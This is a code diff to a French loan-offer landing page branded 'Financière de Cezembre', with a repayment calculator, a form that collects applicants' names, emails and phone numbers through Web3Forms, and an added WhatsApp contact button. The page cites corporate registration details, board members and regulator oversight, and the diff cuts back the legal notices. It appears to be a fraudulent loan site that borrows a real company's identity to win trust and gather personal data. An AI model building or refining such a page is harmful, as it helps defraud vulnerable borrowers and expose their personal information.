@@ -13,12 +13,12 @@
             --gold: #C5A059;
             --light-bg: #F4F7FA;
             --white: #FFFFFF;
+            --whatsapp: #25D366;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
         body { background-color: var(--white); color: #333; overflow-x: hidden; }
 
-        /* HEADER */
         header {
             background: var(--white); padding: 20px 8%; display: flex;
             justify-content: space-between; align-items: center;
@@ -28,26 +28,14 @@
         .nav-links { display: flex; gap: 30px; align-items: center; }
         .nav-links a { text-decoration: none; color: #666; font-size: 0.9rem; font-weight: 500; }
 
-        /* SYSTÈME DE LANGUES */
         .lang-container { position: relative; }
-        .lang-btn { 
-            background: #EEE; padding: 8px 15px; border-radius: 4px; font-size: 0.8rem; 
-            cursor: pointer; display: flex; align-items: center; gap: 8px; border: none;
-        }
-        .lang-dropdown {
-            position: absolute; top: 110%; right: 0; background: white;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-radius: 4px;
-            display: none; grid-template-columns: 1fr 1fr; min-width: 280px; padding: 10px; z-index: 1001;
-        }
+        .lang-btn { background: #EEE; padding: 8px 15px; border-radius: 4px; font-size: 0.8rem; cursor: pointer; display: flex; align-items: center; gap: 8px; border: none; }
+        .lang-dropdown { position: absolute; top: 110%; right: 0; background: white; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-radius: 4px; display: none; grid-template-columns: 1fr 1fr; min-width: 280px; padding: 10px; z-index: 1001; }
         .lang-dropdown.active { display: grid; }
-        .lang-item {
-            display: flex; align-items: center; gap: 10px; padding: 8px 12px;
-            text-decoration: none; color: #333; font-size: 0.75rem; transition: 0.2s;
-        }
-        .lang-item:hover { background: var(--light-bg); color: var(--navy); }
-        .lang-item img { width: 18px; height: 12px; object-fit: cover; border-radius: 2px; }
+        .lang-item { display: flex; align-items: center; gap: 10px; padding: 8px 12px; text-decoration: none; color: #333; font-size: 0.75rem; transition: 0.2s; }
+        .lang-item:hover { background: var(--light-bg); }
+        .lang-item img { width: 18px; height: 12px; object-fit: cover; }
 
-        /* HERO & SIMULATEUR */
         .hero {
             height: 100vh; background: linear-gradient(rgba(0,26,77,0.7), rgba(0,26,77,0.7)), 
             url('https://images.unsplash.com/photo-1497366216548-37526070297c?auto=format&fit=crop&q=80&w=2000');
@@ -57,10 +45,7 @@
         .hero-content { max-width: 600px; }
         .hero-content h1 { font-size: 3.5rem; line-height: 1.2; margin-bottom: 20px; }
         
-        .simulator {
-            background: var(--white); padding: 40px; border-radius: 2px; width: 480px;
-            box-shadow: 0 30px 60px rgba(0,0,0,0.4); color: var(--navy);
-        }
+        .simulator { background: var(--white); padding: 40px; border-radius: 2px; width: 480px; box-shadow: 0 30px 60px rgba(0,0,0,0.4); color: var(--navy); }
         .sim-row { margin-bottom: 20px; }
         .sim-row label { display: flex; justify-content: space-between; font-weight: 600; margin-bottom: 10px; font-size: 0.9rem; }
         input[type="range"] { width: 100%; height: 4px; accent-color: var(--gold); }
@@ -84,6 +69,17 @@
         .legal-block { border-top: 1px solid #222; padding-top: 40px; line-height: 1.8; }
         .tag-warning { border: 1px solid #444; padding: 15px; margin-top: 20px; color: #AAA; text-align: center; }
 
+        /* BOUTON WHATSAPP */
+        .whatsapp-float {
+            position: fixed; bottom: 30px; left: 30px;
+            background-color: var(--whatsapp); color: #FFF;
+            width: 60px; height: 60px; border-radius: 50px;
+            text-align: center; font-size: 30px; box-shadow: 2px 2px 10px rgba(0,0,0,0.2);
+            z-index: 1000; display: flex; align-items: center; justify-content: center;
+            text-decoration: none; transition: 0.3s;
+        }
+        .whatsapp-float:hover { transform: scale(1.1); background-color: #128C7E; }
+
         #goUp { position: fixed; bottom: 30px; right: 30px; background: var(--gold); color: white; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; display: none; }
     </style>
 </head>
@@ -95,11 +91,8 @@
         <a href="#about">Notre Expertise</a>
         <a href="#legal">Gouvernance</a>
         <a href="#contact">Contact</a>
-        
         <div class="lang-container">
-            <button class="lang-btn" onclick="toggleLang()">
-                <i class="fas fa-globe-europe"></i> <span id="currentLang">FRANCE</span>
-            </button>
+            <button class="lang-btn" onclick="toggleLang()"><i class="fas fa-globe-europe"></i> <span id="currentLang">FRANCE</span></button>
             <div class="lang-dropdown" id="langBox">
                 <a href="#" class="lang-item" onclick="setLang('FRANCE')"><img src="https://flagcdn.com/w40/fr.png"> Français</a>
                 <a href="#" class="lang-item" onclick="setLang('UNITED KINGDOM')"><img src="https://flagcdn.com/w40/gb.png"> English</a>
@@ -108,13 +101,15 @@
                 <a href="#" class="lang-item" onclick="setLang('PORTUGAL')"><img src="https://flagcdn.com/w40/pt.png"> Português</a>
                 <a href="#" class="lang-item" onclick="setLang('ITALIA')"><img src="https://flagcdn.com/w40/it.png"> Italiano</a>
                 <a href="#" class="lang-item" onclick="setLang('SVERIGE')"><img src="https://flagcdn.com/w40/se.png"> Svenska</a>
-                <a href="#" class="lang-item" onclick="setLang('SLOVENIJA')"><img src="https://flagcdn.com/w40/si.png"> Slovenščina</a>
-                <a href="#" class="lang-item" onclick="setLang('SLOVENSKO')"><img src="https://flagcdn.com/w40/sk.png"> Slovenčina</a>
                 <a href="#" class="lang-item" onclick="setLang('KOSOVA')"><img src="https://flagcdn.com/w40/xk.png"> Kosovë</a>
             </div>
         </div>
     </div>
 </header>
+
+<a href="https://wa.me/33780976404" class="whatsapp-float" target="_blank" title="Besoin d'aide ? Contactez-nous">
+    <i class="fab fa-whatsapp"></i>
+</a>
 
 <section class="hero">
     <div class="hero-content">
@@ -151,18 +146,15 @@
                 <input type="hidden" name="montant_client" id="hiddenAmt">
                 <input type="hidden" name="duree_client" id="hiddenDur">
                 <input type="hidden" name="mensualite_client" id="hiddenMens">
-
                 <input type="text" name="nom" placeholder="Nom et Prénom" class="form-input" required>
                 <select name="projet" class="form-input" required>
                     <option value="" disabled selected>Choisir votre projet</option>
                     <option value="Personnel">Prêt Personnel</option>
                     <option value="Auto">Auto / Moto</option>
                     <option value="Travaux">Travaux / Rénovation</option>
-                    <option value="Rachat">Rachat de crédit</option>
                 </select>
                 <input type="email" name="email" placeholder="Adresse e-mail" class="form-input" required>
-                <input type="tel" name="telephone" placeholder="Numéro de téléphone" class="form-input" required>
-
+                <input type="tel" name="telephone" placeholder="Téléphone" class="form-input" required>
                 <button type="submit" class="btn-main">CONFIRMER L'ENVOI</button>
                 <div class="security-tag"><i class="fas fa-lock"></i> Transfert sécurisé SSL 256-bit</div>
                 <div id="formStatus" style="margin-top:10px; font-size:0.8rem; text-align:center;"></div>
@@ -185,19 +177,14 @@
 
 <footer id="legal">
     <div class="f-grid">
-        <div>
-            <h4>FINANCIÈRE DE CEZEMBRE</h4>
-            <p>Distribution de crédit et participations financières régulées.<br>Identifiant LEI : 969500WONJGTDZG8E035</p>
-        </div>
+        <div><h4>FINANCIÈRE DE CEZEMBRE</h4><p>Distribution de crédit et participations financières régulées.<br>LEI : 969500WONJGTDZG8E035</p></div>
         <div><h4>SIÈGE SOCIAL</h4><p>ODET, 29500<br>ERGUÉ-GABÉRIC, France<br>RCS Quimper 552 058 943</p></div>
-        <div><h4>GOUVERNANCE</h4><p>Président : M. Michel Pajot<br>Administrateurs : Bolloré SE, Financière Arnil, Socotab.</p></div>
-        <div><h4>AUDIT</h4><p>Commissaire : Constantin Associés<br>Suppléant : BEAS (Paris La Défense)</p></div>
+        <div><h4>GOUVERNANCE</h4><p>M. Michel Pajot<br>Bolloré SE, Financière Arnil.</p></div>
+        <div><h4>AUDIT</h4><p>Constantin Associés<br>BEAS (La Défense)</p></div>
     </div>
     <div class="legal-block">
-        <strong>INFORMATIONS LÉGALES ET RÉGLEMENTAIRES :</strong><br>
-        FINANCIÈRE DE CEZEMBRE SA au capital de 1 200 000 €. SIRET 552 058 943 00044. TVA FR05552058943. 
-        Conformément à la loi française, notre activité est soumise au contrôle de l'Autorité de Contrôle Prudentiel et de Résolution (ACPR). 
-        <div class="tag-warning">UN CRÉDIT VOUS ENGAGE ET DOIT ÊTRE REMBOURSÉ. VÉRIFIEZ VOS CAPACITÉS DE REMBOURSEMENT AVANT DE VOUS ENGAGER.</div>
+        <strong>INFORMATIONS LÉGALES :</strong> FINANCIÈRE DE CEZEMBRE SA. SIRET 552 058 943 00044. Soumis à l'ACPR. 
+        <div class="tag-warning">UN CRÉDIT VOUS ENGAGE ET DOIT ÊTRE REMBOURSÉ.</div>
     </div>
     <p style="text-align:center; margin-top:40px; color:#555;">&copy; 2026 FINANCIÈRE DE CEZEMBRE - Tous droits réservés.</p>
 </footer>
@@ -205,21 +192,9 @@
 <div id="goUp" onclick="window.scrollTo({top:0, behavior:'smooth'})"><i class="fas fa-arrow-up"></i></div>
 
 <script>
-    // GESTION DES LANGUES
-    function toggleLang() {
-        document.getElementById('langBox').classList.toggle('active');
-    }
-    function setLang(name) {
-        document.getElementById('currentLang').innerText = name;
-        document.getElementById('langBox').classList.remove('active');
-    }
-    window.onclick = function(event) {
-        if (!event.target.matches('.lang-btn') && !event.target.parentElement.matches('.lang-btn')) {
-            document.getElementById('langBox').classList.remove('active');
-        }
-    }
-
-    // CALCULATEUR
+    function toggleLang() { document.getElementById('langBox').classList.toggle('active'); }
+    function setLang(name) { document.getElementById('currentLang').innerText = name; document.getElementById('langBox').classList.remove('active'); }
+    
     const amtR = document.getElementById('amtRange');
     const amtN = document.getElementById('amtNum');
     const durR = document.getElementById('durRange');
@@ -227,11 +202,8 @@
     const resM = document.getElementById('monthlyRes');
 
     function calc() {
-        let p = parseFloat(amtR.value);
-        let n = parseInt(durR.value);
-        let r = 0.035 / 12;
-        amtN.value = p;
-        durT.innerText = n + " mois";
+        let p = parseFloat(amtR.value); let n = parseInt(durR.value); let r = 0.035 / 12;
+        amtN.value = p; durT.innerText = n + " mois";
         let m = (p * r) / (1 - Math.pow(1 + r, -n));
         resM.innerText = m.toFixed(2);
         document.getElementById('hiddenAmt').value = p + " €";
@@ -239,38 +211,24 @@
         document.getElementById('hiddenMens').value = m.toFixed(2) + " €";
     }
 
-    function goToStep2() {
-        document.getElementById('step1').style.display = 'none';
-        document.getElementById('step2').style.display = 'block';
-    }
-
-    amtR.oninput = calc;
-    durR.oninput = calc;
+    function goToStep2() { document.getElementById('step1').style.display = 'none'; document.getElementById('step2').style.display = 'block'; }
+    amtR.oninput = calc; durR.oninput = calc;
     window.onscroll = () => { document.getElementById('goUp').style.display = (window.scrollY > 500) ? 'flex' : 'none'; };
     calc();
 
-    // WEB3FORMS
     const form = document.getElementById('loanForm');
     form.onsubmit = async (e) => {
         e.preventDefault();
-        const status = document.getElementById('formStatus');
-        status.innerHTML = "Envoi en cours...";
+        const status = document.getElementById('formStatus'); status.innerHTML = "Envoi...";
         const formData = new FormData(form);
-        const object = Object.fromEntries(formData);
-        const json = JSON.stringify(object);
         const response = await fetch('https://api.web3forms.com/submit', {
             method: 'POST',
-            headers: {'Content-Type': 'application/json', 'Accept': 'application/json'},
-            body: json
+            body: formData
         });
         if (response.status == 200) {
-            status.style.color = "green";
-            status.innerHTML = "Demande envoyée avec succès !";
+            status.style.color = "green"; status.innerHTML = "Envoyé avec succès !";
             form.reset();
-        } else {
-            status.style.color = "red";
-            status.innerHTML = "Erreur lors de l'envoi.";
-        }
+        } else { status.style.color = "red"; status.innerHTML = "Erreur."; }
     };
 </script>
 </body>
